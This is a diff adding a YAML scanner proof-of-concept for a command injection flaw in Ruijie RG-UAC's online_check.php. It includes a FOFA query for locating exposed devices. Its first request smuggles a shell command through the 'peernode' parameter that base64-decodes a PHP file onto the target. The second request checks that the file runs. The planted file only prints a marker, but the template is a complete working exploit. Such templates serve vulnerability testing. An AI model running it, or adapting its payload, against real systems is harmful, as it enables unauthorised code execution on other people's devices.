@@ -1,0 +1,18 @@
+id: poc-yaml-ruijie-uac-online-check-php-cmd-injection
+info:
+  name: 锐捷Ruijie-UAC online_check.php 命令注入漏洞
+  severity: critical
+  tags:
+  - 两高一弱
+  - 命令注入
+  finger: Ruijie-UAC
+  fofa: title="RG-UAC登录页面"
+requests:
+- method: GET
+  path: /view/vpn/autovpn/online_check.php?peernode=%20|%20`echo%20PD9waHAgZWNobyB2dWxuZXJhYmlsaXR5Ow==%20|%20base64%20-d%20%3E%20test.php`
+  expression: status_code == 200 && contains(body,"iii:0,hit:0")
+- method: GET
+  path: /view/vpn/autovpn/test.php
+  expression: status_code == 200 && body == "vulnerability"
+variables: {}
+transport: http
